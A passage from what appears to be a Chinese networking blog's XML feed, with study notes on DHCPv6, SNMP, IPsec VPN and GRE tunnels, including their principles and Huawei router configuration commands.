src="https://pic.imgdb.cn/item/60f789825132923bf87a225b.png"></p><p>路由器RTA的loopback接口和GigabitEthernet0/0/0接口都启用OSPFv3进程，并且都属于区域0</p></li></ul><p>验证：<br>在邻居路由器上完成OSPFv3配置后，执行<code>display ospfv3</code>命令可以验证OSPFv3配置及相关参数</p><h2 id="3-DHCPv6原理与配置"><a href="#3-DHCPv6原理与配置" class="headerlink" title="3. DHCPv6原理与配置"></a>3. DHCPv6原理与配置</h2><h3 id="3-1-DHCPv6基本概念"><a href="#3-1-DHCPv6基本概念" class="headerlink" title="3.1 DHCPv6基本概念"></a>3.1 DHCPv6基本概念</h3><ul><li>主机在运行IPv6时，可以通过使用无状态地址自动配置或DHCPv6协议来获取IPv6地址</li><li>主机使用无状态地址自动配置方案来获取IPv6地址时，路由器并不记录主机的IPv6地址信息，可管理性差﹔另外，IPv6主机无法获取DNS服务器地址等网络配置信息，在可用性上也存在一定的缺陷</li><li>DHCPv6属于一种有状态地址自动配置协议。在有状态地址配置过程中，DHCPv6服务器为主机分配一个完整的IPv6地址，并提供DNS服务器地址等其他配置信息。此外，DHCPv6服务器还可以对已经分配的IPv6地址和客户端进行集中管理</li><li>DHCPv6服务器与客户端之间使用UDP协议来交互DHCPv6报文，客户端使用的UDP端口号是546，服务器使用的UDP端口号是547</li></ul><h3 id="3-2-DHCPv6基本概念"><a href="#3-2-DHCPv6基本概念" class="headerlink" title="3.2 DHCPv6基本概念"></a>3.2 DHCPv6基本概念</h3><ul><li>DHCPv6基本协议架构中，主要包括以下三种角色：<ol><li>DHCPv6客户端︰通过与DHCPv6服务器进行交互，获取IPv6地址/前缀和网络配置信息，完成自身的地址配置功能</li><li>DHCPv6中继︰负责转发来自客户端方向或服务器方向的DHCPv6报文，协助DHCPv6客户端和DHCPv6服务器完成地址配置功能。只有当DHCPv6客户端和DHCPv6服务器不在同一链路范围内，或者DHCPv6客户端和DHCPv6服务器无法单播交互的情况下，才需要DHCPv6中继的参与</li><li>DHCPv6服务器∶负责处理来自客户端或中继的地址分配、地址续租、地址释放等请求，为客户端分配IPv6地址/前缀和其他网络配置信息</li></ol></li><li>客户端发送DHCPv6请求报文来获取IPv6地址等网络配置参数，使用的源地址为客户端接口的链路本地地址，目的地址为ff02::1:2。ff02::1:2表示的是所有DHCPv6服务器和中继，这个地址是链路范围的</li><li>DHCP设备唯一标识符DUID ( DHCPv6 Unique Identifier )用来标识一台DHCPv6服务器或客户端。每个DHCPv6服务器或客户端有且只有一个DUID</li><li>DUID采用以下两种方式生成︰<ol><li>基于链路层地址( LL)∶即采用链路层地址方式来生成DUID</li><li>基于链路层地址与时间组合(LLT )∶即采用链路层地址和时间组合方式来生成DUID</li></ol></li></ul><h3 id="3-3-DHCPv6地址分配"><a href="#3-3-DHCPv6地址分配" class="headerlink" title="3.3 DHCPv6地址分配"></a>3.3 DHCPv6地址分配</h3><ul><li>DHCPv6分配地址时又分为：<ol><li>DHCPv6有状态自动分配︰DHCPv6服务器为客户端分配IPv6地址及其他网络配置参数(如DNS、NIS、SNTP服务器地址等)</li><li>DHCPv6无状态自动分配∶主机的IPv6地址仍然通过路由通告方式自动生成，DHCPv6服务器只分配除IPv6地址以外的配置参数（如DNS、NIS、SNTP服务器等)</li></ol></li><li>DHCPv6客户端在向DHCPv6服务器发送请求报文之前，会发送RS报文，在同一链路范围的路由器接收到此报文后会回复RA报文。在RA报文中包含管理地址配置标记(M)和有状态配置标记(O)。当M取值为1时，启用DHCPv6有状态地址配置，即DHCPv6客户端需要从DHCPv6服务器获取IPv6地址，取值为O则启用IPv6无状态地址自动分配方案。当O取值为1时，用来定义客户端需要通过有状态的DHCPv6来获取其它网络配置参数，如DNS、NIS、SNTP服务器地址等，取值为0则启用IPv6无状态地址自动分配方案</li></ul><h4 id="3-3-1-DHCPv6有状态自动分配"><a href="#3-3-1-DHCPv6有状态自动分配" class="headerlink" title="3.3.1 DHCPv6有状态自动分配"></a>3.3.1 DHCPv6有状态自动分配</h4><ul><li>DHCPv6四步交互地址分配过程如下∶<ol><li>DHCPv6客户端发送Solicit报文，请求DHCPv6服务器为其分配IPv6地址和网络配置参数</li><li>DHCPv6服务器回复Advertise报文，该报文中携带了为客户端分配的IPv6地址以及其它网络配置参数</li><li>DHCPv6客户端如果接收到了多个服务器回复的Advertise报文，则会根据Advertise报文中的服务器优先级等参数来选择优先级最高的一台服务器，并向所有的服务器发送Request组播报文</li><li>被选定的DHCPv6服务器回复Reply报文，确认将IPv6地址和网络配置参数分配给客户端使用</li></ol></li></ul><h4 id="3-3-2-DHCPv6无状态自动分配"><a href="#3-3-2-DHCPv6无状态自动分配" class="headerlink" title="3.3.2 DHCPv6无状态自动分配"></a>3.3.2 DHCPv6无状态自动分配</h4><ul><li>DHCPv6无状态工作过程如下︰<ol><li>DHCPv6客户端以组播方式向DHCPv6服务器发送Information-Request报文，该报文中携带Option Request选项，用来指定DHCPv6客户端需要从DHCPv6服务器获取的配置参数</li><li>DHCPv6服务器收到Information-Request报文后，为DHCPv6客户端分配网络配置参数，并单播发送Reply报文，将网络配置参数返回给DHCPv6客户端</li><li>DHCPv6客户端根据收到的Reply报文中提供的参数完成DHCPv6客户端无状态配置</li></ol></li></ul><h3 id="3-4-DHCPv6-配置"><a href="#3-4-DHCPv6-配置" class="headerlink" title="3.4 DHCPv6 配置"></a>3.4 DHCPv6 配置</h3><ul><li><code>dhcpv6 duid &#123; ll | llt &#125;</code>命令可以用来指定DUID格式为DUID-LL或DUID-LLT。缺省情况下，ARG3系列路由器采用的DUID格式是DUID-LL。当使用DUID-LLT格式时，时间戳值引用的是从执行dhcpv6 duid llt命令的时间点开始计算的时间</li><li>可以使用<code>display dhcpv6 duid</code>命令来验证当前使用的DUID格式以及DUID值</li><li><code>dhcpv6 pool pool-name</code>命令用来创建IPv6地址池或进入到IPv6地址池视图</li><li><code>address prefix ipv6-prefix/ipv6-prefix-length</code>命令用来在IPv6地址池视图下绑定IPv6地址前缀。<code>ipv6-prefix/ipv6-prefix-length</code>用来指定IPv6地址池绑定的网络前缀和前缀长度</li><li><code>excluded-address start-ipv6-address [to end-ipv6-address]</code>命令用来配置IPv6地址池中不参与自动分配的IPv6地址范围</li><li><code>dns-server ipv6-address</code>命令用来配置DNS服务器的IPv6地址</li><li><code>dns-domain-name dns-domain-name</code>命令用来配置为DHCPv6客户端分配的域名后缀</li><li><code>dhcpv6 server pool-name</code>命令用来在接口下配置DHCPv6服务器功能，pool-name用来指定接口下配置的DHCPv6地址池名称</li></ul><p>验证：</p><p><code>display dhcpv6 pool</code>命令用来查看DHCPv6服务器上配置的地址池信息</p>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>IPv6介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SNMP原理与配置</title>
    <link href="/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BB%8B%E7%BB%8D/SNMP%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BB%8B%E7%BB%8D/SNMP%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="SNMP原理与配置"><a href="#SNMP原理与配置" class="headerlink" title="SNMP原理与配置"></a>SNMP原理与配置</h1><h2 id="1-SNMP应用场景"><a href="#1-SNMP应用场景" class="headerlink" title="1. SNMP应用场景"></a>1. SNMP应用场景</h2><ul><li>SNMP是广泛应用于TCP/IP网络的一种网络管理协议。SNMP提供了一种通过运行网络管理软件NMS ( Network Management System )的网络管理工作站来管理网络设备的方法</li><li>SNMP支持以下几种操作∶<ol><li>NMS通过SNMP协议给网络设备发送配置信息</li><li>NMS通过SNMP来查询和获取网络中的资源信息</li><li>网络设备主动向NMS上报告警消息，使得网络管理员能够及时处理各种网络问题</li></ol></li></ul><h2 id="2-SNMP架构"><a href="#2-SNMP架构" class="headerlink" title="2. SNMP架构"></a>2. SNMP架构</h2><ul><li>NMS是运行在网管主机上的网络管理软件。网络管理员通过操作NMS，向被管理设备发出请求，从而可以监控和配置网络设备</li><li>Agent是运行在被管理设备上的代理进程。被管理设备在接收到NMS发出的请求后，由Agent作出响应操作。Agent的主要功能包括︰收集设备状态信息、实现NMS对设备的远程操作、向NMS发送告警消息</li><li>管理信息库MIB ( Management Information Base )是一个虚拟的数据库，是在被管理设备端维护的设备状态信息集。Agent通过查找MIB来收集设备状态信息</li></ul><h2 id="3-SNMP版本"><a href="#3-SNMP版本" class="headerlink" title="3. SNMP版本"></a>3. SNMP版本</h2><ul><li>SNMPv1:网管端工作站上的NMS与被管理设备上的Agent之间，通过交互SNMPv1报文，可以实现网管端对被管理设备的管理。SNMPv1基本上没有什么安全性可言</li><li>SNMPv2c在继承SNMPv1的基础上，其性能、安全性、机密性等方面都有了大的改进</li><li>SNMPv3是在SNMPv2基础之上增加、完善了安全和管理机制。SNMPv3体系结构体现了模块化的设计思想，使管理者可以方便灵活地实现功能的增加和修改。SNMPv3的主要特点在于适应性强，可适用于多种操作环境，它不仅可以管理最简单的网络，实现基本的管理功能，也可以提供强大的网络管理功能，满足复杂网络的管理需求</li></ul><h2 id="4-SNMPv1"><a href="#4-SNMPv1" class="headerlink" title="4.SNMPv1"></a>4.SNMPv1</h2><p>SNMPv1定义了5种协议操作︰</p><p><img src="https://pic.imgdb.cn/item/60f7802a5132923bf85b519d.png"></p><ol><li>Get-Request : NMS从代理进程的MIB中提取一个或多个参数值</li><li>Get-Next-Request : NMS从代理进程的MIB中按照字典式排序提取下一个参数值</li><li>Set-Request : NMS设置代理进程MIB中的一个或多个参数值</li><li>Response :代理进程返回一个或多个参数值。它是前三种操作的响应操作</li><li>Trap :代理进程主动向NMS发送报文，告知设备上发生的紧急或重要事件</li></ol><h2 id="5-SNMPv2c"><a href="#5-SNMPv2c" class="headerlink" title="5. SNMPv2c"></a>5. SNMPv2c</h2><p>SNMPv2c新增了2种协议操作：</p><ol><li>GetBulk :相当于连续执行多次GetNext操作。在NMS上可以设置被管理设备在一次GetBulk报文交互时，执行GetNext操作的次数</li><li>Inform:被管理设备向NMS主动发送告警。与trap告警不同的是，被管理设备发送Inform告警后，需要NMS进行接收确认。如果被管设备没有收到确认信息则会将告警暂时保存在Inform缓存中，并且会重复发送该告警，直到NMS确认收到了该告警或者发送次数已经达到了最大重传次数</li></ol><h2 id="6-SNMPv3"><a href="#6-SNMPv3" class="headerlink" title="6. SNMPv3"></a>6. SNMPv3</h2><p>SNMPv3的实现原理和SNMPv1/SNMPv2c基本一致，主要的区别是SNMPv3增加了身份验证和加密处理</p><p><img src="https://pic.imgdb.cn/item/60f780895132923bf85c8224.png"></p><ol><li>NMS向Agent发送不带安全参数的Get请求报文，向Agent获取安全参数等信息</li><li>Agent响应NMS的请求，向NMS反馈所请求的参数</li><li>NMS向Agent发送带安全参数的Get请求报文</li><li>Agent对NMS发送的请求消息进行认证，认证通过后对消息进行解密，解密成功后，向NMS发送加密的响应</li></ol><h2 id="7-SNMP-配置"><a href="#7-SNMP-配置" class="headerlink" title="7. SNMP 配置"></a>7. SNMP 配置</h2><ul><li><code>snmp-agent</code>命令用来使能SNMP代理</li><li>执行<code>snmp-agent sys-info version [ [ v1 / v2c | v3 ] * | all ]</code>命令可以配置SNMP系统信息，其中**version [ [ v1 / v2c | v3 ]*|all ]**指定设备运行的SNMP版本。缺省情况下，ARG3系列路由器支持SNMPv1 ，SNMPv2c，SNMPv3版本</li><li>执行<code>snmp-agent trap enable</code>命令，可以激活代理向NMS发送告警消息的功能，这一功能激活后，设备将向NMS上报任何异常事件。另外，还需要指定发送告警通告的接口，本示例中指定的是与NMS相连的GigabitEthernet 0/0/1接口</li></ul><p>执行<code>display snmp-agent sys-info</code>命令，可以查看系统维护的相关信息，包括设备的物理位置和SNMP版本。</p>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>网络管理介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPsec VPN,GRE原理与配置</title>
    <link href="/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BB%8B%E7%BB%8D/IPsec%20VPN,GRE%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/07/21/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BB%8B%E7%BB%8D/IPsec%20VPN,GRE%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="IPsec-VPN-GRE原理与配置"><a href="#IPsec-VPN-GRE原理与配置" class="headerlink" title="IPsec VPN,GRE原理与配置"></a>IPsec VPN,GRE原理与配置</h1><h2 id="1-IPsec-VPN原理与配置"><a href="#1-IPsec-VPN原理与配置" class="headerlink" title="1. IPsec VPN原理与配置"></a>1. IPsec VPN原理与配置</h2><h3 id="1-1-IPsec-VPN应用场景"><a href="#1-1-IPsec-VPN应用场景" class="headerlink" title="1.1 IPsec VPN应用场景"></a>1.1 IPsec VPN应用场景</h3><ul><li>IPSec是IETF定义的一个协议组。通信双方在IP层通过加密、完整性校验、数据源认证等方式，保证了IP数据报文在网络上传输的机密性、完整性和防重放<ol><li>机密性(Confidentiality )指对数据进行加密保护，用密文的形式传送数据</li><li>完整性(Data integrity )指对接收的数据进行认证，以判定报文是否被篡改</li><li>防重放(Anti-replay)指防止恶意用户通过重复发送捕获到的数据包所进行的攻击，即接收方会拒绝旧的或重复的数据包</li></ol></li><li>企业远程分支机构可以通过使用IPSec VPN建立安全传输通道，接入到企业总部网络</li></ul><h3 id="1-2-IPsec架构"><a href="#1-2-IPsec架构" class="headerlink" title="1.2 IPsec架构"></a>1.2 IPsec架构</h3><ul><li>IPSec VPN体系结构主要由AH ( Authentication Header )、ESP ( EncapsulatingSecurity Payload )和IKE ( Internet Key Exchange )协议套件组成<ol><li>AH协议∶主要提供的功能有数据源验证、数据完整性校验和防报文重放功能。然而，AH并不加密所保护的数据报</li><li>ESP协议︰提供AH协议的所有功能外(但其数据完整性校验不包括IP头），还可提供对IP报文的加密功能</li><li>IKE协议︰用于自动协商AH和ESP所使用的密码算法</li></ol></li></ul><h3 id="1-3-安全联盟SA"><a href="#1-3-安全联盟SA" class="headerlink" title="1.3 安全联盟SA"></a>1.3 安全联盟SA</h3><ul><li>SA ( Security Association )安全联盟定义了IPSec通信对等体间将使用的数据封装模式、认证和加密算法、秘钥等参数。SA是单向的，两个对等体之间的双向通信，至少需要两个SA。如果两个对等体希望同时使用AH和ESP安全协议来进行通信，则对等体针对每一种安全协议都需要协商一对SA</li><li>SA由一个三元组来唯一标识，这个三元组包括安全参数索引SPI ( Security ParameterIndex )、目的IP地址、安全协议(AH或ESP)</li><li>建立SA的方式有以下两种︰<ol><li>手工方式︰安全联盟所需的全部信息都必须手工配置。手工方式建立安全联盟比较复杂，但优点是可以不依赖IKE而单独实现IPSec功能。当对等体设备数量较少时，或是在小型静态环境中，手工配置SA是可行的</li><li>IKE动态协商方式∶只需要通信对等体间配置好IKE协商参数，由IKE自动协商来创建和维护SA。动态协商方式建立安全联盟相对简单些。对于中、大型的动态网络环境中，推荐使用IKE协商建立SA</li></ol></li></ul><h3 id="1-4-IPSec-传输模式"><a href="#1-4-IPSec-传输模式" class="headerlink" title="1.4 IPSec 传输模式"></a>1.4 IPSec 传输模式</h3><p><img src="https://pic.imgdb.cn/item/60f77a6c5132923bf8491a2d.png"></p><ul><li>IPSec协议有两种封装模式∶传输模式和隧道模式<ol><li>传输模式中<ul><li>在IP报文头和高层协议之间插入AH或ESP头。传输模式中的AH或ESP主要对上层协议数据提供保护</li><li>传输模式中的AH:在P头部之后插入AH头，对整个IP数据包进行完整性校验</li><li>传输模式中的ESP∶在IP头部之后插入ESP头，在数据字段后插入尾部以及认证字段。对高层数据和ESP尾部进行加密，对IP数据包中的ESP报文头，高层数据和ESP尾部进行完整性校验</li><li>传输模式中的AH+ESP:在IP头部之后插入AH和ESP头，在数据字段后插入尾部以及认证字段</li></ul></li><li>隧道模式中<ul><li>AH或ESP头封装在原始IP报文头之前，并另外生成一个新的IP头封装到AH或ESP之前。隧道模式可以完全地对原始IP数据报进行认证和加密，而且，可以使用IPSec对等体的IP地址来隐藏客户机的IP地址</li><li>隧道模式中的AH:对整个原始IP报文提供完整性检查和认证，认证功能优于ESP。但AH不提供加密功能，所以通常和ESP联合使用</li><li>隧道模式中的ESP∶对整个原始P报文和ESP尾部进行加密，对ESP报文头、原始IP报文和ESP尾部进行完整性校验</li><li>隧道模式中的AH+ESP∶对整个原始IP报文和ESP尾部进行加密，AH、ESP分别会对不同部分进行完整性校验</li></ul></li></ol></li></ul><h3 id="1-5-IPSec-VPN-配置步骤"><a href="#1-5-IPSec-VPN-配置步骤" class="headerlink" title="1.5 IPSec VPN 配置步骤"></a>1.5 IPSec VPN 配置步骤</h3><ul><li><p>配置IPSec VPN的步骤如下∶</p><ol><li>首先需要检查报文发送方和接收方之间的网络层可达性，确保双方只有建立IPSec VPN隧道才能进行IPSec通信</li><li>第二步是定义数据流。因为部分流量无需满足完整性和机密性要求，所以需要对流量进行过滤，选择出需要进行IPSec处理的兴趣流。可以通过配置ACL来定义和区分不同的数据流</li><li>第三步是配置IPSec安全提议。IPSec提议定义了保护数据流所用的安全协议、认证算法、加密算法和封装模式。安全协议包括AH和ESP，两者可以单独使用或一起使用。AH支持MD5和SHA-1认证算法;ESP支持两种认证算法(MD5和SHA-1)和三种加密算法<br>(DES、3DES和AES )。为了能够正常传输数据流，安全隧道两端的对等体必须使用相同的安全协议、认证算法、加密算法和封装模式。如果要在两个安全网关之间建立IPSec隧道，建议将IPSec封装模式设置为隧道模式，以便隐藏通信使用的实际源IP地址和目的IP地址</li><li>第四步是配置IPSec安全策略。IPSec策略中会应用IPSec提议中定义的安全协议、认证算法、加密算法和封装模式。每一个IPSec安全策略都使用唯一的名称和序号来标识。IPSec策略可分成两类∶手工建立SA的策略和IKE协商建立SA的策略</li><li>第五步是在一个接口上应用IPSec安全策略</li></ol></li><li><p>本示例</p><p>  <img src="https://pic.imgdb.cn/item/60f77b475132923bf84bb992.png"></p><p>  IPSec VPN连接是通过配置静态路由建立的，下一跳指向RTB。需要配置两个方向的静态路由确保双向通信可达。建立一条高级ACL，用于确定哪些感兴趣流需要通过IPSec VPN隧道。高级ACL能够依据特定参数过滤流量，继而对流量执行丢弃、通过或保护操作</p></li><li><p>执行<code>ipsec proposal</code>命令，可以创建IPSec提议并进入IPSec提议视图。配置IPSec策略时，必须引用IPSec提议来指定IPSec隧道两端使用的安全协议、加密算法、认证算法和封装模式。缺省情况下，使用<code>ipsec proposal</code>命令创建的IPSec提议采用ESP协议、MD5认证算法和隧道封装模式。在IPSec提议视图下执行下列命令可以修改这些参数</p></li><li><p>执行<code>transform [ah | ah-esp | esp]</code>命令，可以重新配置隧道采用的安全协议</p></li><li><p>执行<code>encapsulation-mode &#123;transport | tunnel&#125;</code>命令，可以配置报文的封装模式</p></li><li><p>执行<code>esp authentication-algorithm [md5 | sha1 | sha2-256 | sha2-384 | sha2-512]</code>命令，可以配置ESP协议使用的认证算法</p></li><li><p>执行<code>esp encryption-algorithm [des | 3des | aes-128 | aes-192 | aes-256]</code>命令，可以配置ESP加密算法</p></li><li><p>执行<code>ah authentication-algorithm [md5 | sha1 | sha2-256 | sha2-384 | sha2-512 ]</code>命令，可以配置AH协议使用的认证算法</p></li></ul><h3 id="1-6-配置验证"><a href="#1-6-配置验证" class="headerlink" title="1.6 配置验证"></a>1.6 配置验证</h3><ul><li>执行<code>display ipsec proposal [name &lt;proposal-name&gt;]</code>命令，可以查看IPSec提议中配置的参数</li><li>Number of proposals字段显示的是已创建的IPSec提议的个数。IPSec proposal name字段显示的是已创建IPSec提议的名称</li><li>Encapsulation mode字段显示的指定提议当前使用的封装模式，其值可以为传输模式或隧道模式</li><li>Transform字段显示的是IPSec所采用的安全协议，其值可以是AH、ESP或AH-ESP</li><li>ESP protocol字段显示的是安全协议所使用的认证和加密算法</li></ul><h3 id="1-7-IPSec-VPN-配置"><a href="#1-7-IPSec-VPN-配置" class="headerlink" title="1.7 IPSec VPN 配置"></a>1.7 IPSec VPN 配置</h3><ul><li><code>ipsec policy policy-name seq-number</code>命令用来创建一条IPSec策略，并进入IPSec策略视图。安全策略是由policy-name和seq-number共同来确定的，多个具有相同policy-name的安全策略组成一个安全策略组。在一个安全策略组中最多可以设置16条安全策略，而seq-number越小的安全策略，优先级越高。在一个接口上应用了一个安全策略组，实际上是同时应用了安全策略组中所有的安全策略，这样能够对不同的数据流采用不同的安全策略进行保护</li><li>IPSec策略除了指定策略的名称和序号外，还需要指定SA的建立方式。如果使用的是IKE协商，需要执行<code>ipsec-policy-template</code>命令配置指定参数。如果使用的是手工建立方式，所有参数都需要手工配置。本示例采用的是手工建立方式</li><li><code>security acl acl-number</code>命令用来指定IPSec策略所引用的访问控制列表</li><li><code>proposal proposal-name</code>命令用来指定IPSec策略所引用的提议</li><li><code>tunnel local &#123; ip-address | binding-interface &#125;</code>命令用来配置安全隧道的本端地址</li><li><code>tunnel remote ip-address</code>命令用来设置安全隧道的对端地址</li><li><code>sa spi &#123; inbound | outbound &#125; &#123; ah | esp &#125; spi-number</code>命令用来设置安全联盟的安全参数索引SPI。在配置安全联盟时，入方向和出方向安全联盟的安全参数索引都必须设置，并且本端的入方向安全联盟的SPI值必须和对端的出方向安全联盟的SPI值相同，而本端的出方向安全联盟的SPI值必须和对端的入方向安全联盟的SPI值相同</li><li><code>sa string-key &#123; inbound | outbound &#125; ( ah | esp &#125; &#123; simple | cipher &#125; string-key</code>命令用来设置安全联盟的认证密钥。入方向和出方向安全联盟的认证密钥都必须设置，并且本端的入方向安全联盟的密钥必须和对端的出方向安全联盟的密钥相同;同时，本端的出方向安全联盟密钥必须和对端的入方向安全联盟的密钥相同</li><li><code>ipsec policy policy-name</code>命令用来在接口上应用指定的安全策略组。手工方式配置的安全策略只能应用到一个接口</li></ul><p>执行<code>display ipsec policy [brief | name policy-name[ seq-number]</code>命令，可以查看指定IPSec策略或所有IPSec策略。命令的显示信息中包括︰策略名称、策略序号、提议名称、ACL、隧道的本端地址和隧道的远端地址等</p><p>执行<code>display ipsec policy</code>命令，还可以查看出方向和入方向SA相关的参数。</p><h2 id="2-GRE原理与配置"><a href="#2-GRE原理与配置" class="headerlink" title="2. GRE原理与配置"></a>2. GRE原理与配置</h2><h3 id="2-1-GRE应用场景"><a href="#2-1-GRE应用场景" class="headerlink" title="2.1 GRE应用场景"></a>2.1 GRE应用场景</h3><ul><li>GRE用来对某些网络层协议如IPX ( Internet Packet Exchange )的报文进行封装，使这些被封装的报文能够在另一网络层协议（如IP)中传输。GRE可以解决异种网络的传输问题</li><li>IPSec VPN技术可以创建一条跨越共享公网的隧道，从而实现私网互联。IPSec VPN能够安全传输IP报文，但是无法在隧道的两个端点之间运行RIP和OSPF等路由协议。GRE可以将路由协议信息封装在另一种协议报文（例如IP)中进行传输</li><li>使用GRE可以克服IGP协议的一些局限性。例如，RIP路由协议是一种距离矢量路由协议，最大跳数为15。如果网络直径超过15，设备将无法通信。这种情况下，可以使用GRE技术在两个网络节点之间搭建隧道，隐藏它们之间的跳数，扩大网络的工作范围</li><li>GRE本身并不支持加密，因而通过GRE隧道传输的流量是不加密的。将IPSec技术与GRE相结合，可以先建立GRE隧道对报文进行GRE封装，然后再建立IPSec隧道对报文进行加密，以保证报文传输的完整性和私密性</li></ul><h3 id="2-2-GRE报文结构"><a href="#2-2-GRE报文结构" class="headerlink" title="2.2 GRE报文结构"></a>2.2 GRE报文结构</h3><p><img src="https://pic.imgdb.cn/item/60f77db55132923bf853611b.png"></p><ul><li>GRE封装报文时，封装前的报文称为净荷，封装前的报文协议称为乘客协议，然后GRE会封装GRE头部，GRE成为封装协议，也叫运载协议，最后负责对封装后的报文进行转发的协议称为传输协议</li><li>GRE封装和解封装报文的过程如下︰<ol><li>设备从连接私网的接口接收到报文后，检查报文头中的目的IP地址字段，在路由表查找出接口，如果发现出接口是隧道接口，则将报文发送给隧道模块进行处理</li><li>隧道模块接收到报文后首先根据乘客协议的类型和当前GRE隧道配置的校验和参数，对报文进行GRE封装，即添加GRE报文头</li><li>然后，设备给报文添加传输协议报文头，即IP报文头。该IP报文头的源地址就是隧道源地址，目的地址就是隧道目的地址</li><li>最后，设备根据新添加的IP报文头目的地址，在路由表中查找相应的出接口，并发送报文。之后，封装后的报文将在公网中传输</li><li>接收端设备从连接公网的接口收到报文后，首先分析P报文头，如果发现协议类型字段的值为47，表示协议为GRE，于是出接口将报文交给GRE模块处理。GRE模块去掉P报文头和GRE报文头，并根据GRE报文头的协议类型字段，发现此报文的乘客协议为私网中运行的协议，于是将报文交给该协议处理</li></ol></li></ul><h3 id="2-3-GRE关键字验证"><a href="#2-3-GRE关键字验证" class="headerlink" title="2.3 GRE关键字验证"></a>2.3 GRE关键字验证</h3><p>关键字(Key )验证是指对隧道接口进行校验，这种安全机制可以防止错误接收到来自其他设备的报文。关键字字段是一个四字节长的数值，若GRE报文头中的K位为1，则在GRE报文头中会插入关键字字段。只有隧道两端设置的关键字完全一致时才能通过验证，否则报文将被丢弃</p><h3 id="2-4-Keepalive检测"><a href="#2-4-Keepalive检测" class="headerlink" title="2.4 Keepalive检测"></a>2.4 Keepalive检测</h3><ul><li>Keepalive检测功能用于在任意时刻检测隧道链路是否处于Keepalive状态，即检测隧道对端是否可达。如果对端不可达，隧道连接就会及时关闭，避免形成数据空洞。使能<br>Keepalive检测功能后，GRE隧道本端会定期向对端发送Keepalive探测报文。若对端可达，则本端会收到对端的回应报文﹔若对端不可达，则收不到对端的回应报文。如果在隧道一端配置了Keepalive功能，无论对端是否配置Keepalive，配置的Keepalive功能在该端都生效。隧道对端收到Keepalive探测报文，无论是否配置Keepalive，都会给源端发送一个回应报文</li><li>使能Keepalive检测功能后，GRE隧道的源端会创建一个计数器，并周期性地发送Keepalive探测报文，同时进行不可达计数。每发送一个探测报文，不可达计数加1</li><li>如果源端在计数器值达到预先设置的值之前收到回应报文，则表明对端可达。如果计数器值达到预先设置的重试次数，源端还是没有收到回应报文，则认为对端不可达。此时，源端将关闭隧道连接</li></ul><h3 id="2-5-GRE配置"><a href="#2-5-GRE配置" class="headerlink" title="2.5 GRE配置"></a>2.5 GRE配置</h3><ul><li><code>interface tunnel interface-number</code>命令用来创建Tunnel接口。创建Tunnel接口后，需要配置Tunnel接口的IP地址和Tunnel接口的封装协议</li><li><code>tunnel-protocol</code>命令用来配置Tunnel接口的隧道协议</li><li><code>source &#123; source-ip-address | interface-type interface-number&#125;</code>命令用来配置Tunnel源地址或源接口</li><li><code>destination dest-ip-address</code>命令用来指定Tunnel接口的目的IP地址</li><li>在本端设备和远端设备上还必须存在经过Tunnel转发的路由，这样，需要进行GRE封装的报文才能正确转发。经过Tunnel接口转发的路由可以是静态路由，也可以是动态路由。配置静态路由时，路由的目的地址是GRE封装前原始报文的目的地址，出接口是本端Tunnel接口</li></ul><h3 id="2-6-验证配置"><a href="#2-6-验证配置" class="headerlink" title="2.6 验证配置"></a>2.6 验证配置</h3><ul><li>执行<code>display interface Tunnel0/0/1</code>命令，可以查看接口的运行状态和路由信息。如果接口的当前状态和链路层协议的状态均显示为UP，则接口处于正常转发状态。隧道的源地址和目的地址分别为建立GRE隧道使用的物理接口的IP地址</li><li>执行<code>display ip routing table</code>命令，可以查看IP路由表，判断GRE隧道连接的两个网络的可达信息</li><li>Keepalive检测<ul><li>执行<code>keepalive [ period period [ retry-times retry-times]</code>命令，可以在GRE隧道接口启用Keepalive检测功能。其中，<strong>period</strong>参数指定Keepalive检测报文的发送周期，默认值为5秒;<strong>retry-times</strong>参数指定Keepalive检测报文的重传次数，默认值为3。如果在指定的重传次数内未收到对端的回应报文，则认为隧道两端通信失败，GRE隧道将被拆除</li><li>执行display interface tunnel命令，还可以查看GRE的Keepalive功能是否使能</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络基础</tag>
      
      <tag>访问控制介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络地址转换,访问控制列表,AAA原理与配置</title>
    <link href="/2021/07/20/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BB%8B%E7%BB%8D/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2,%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8,AAA%E5%8E%9F%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
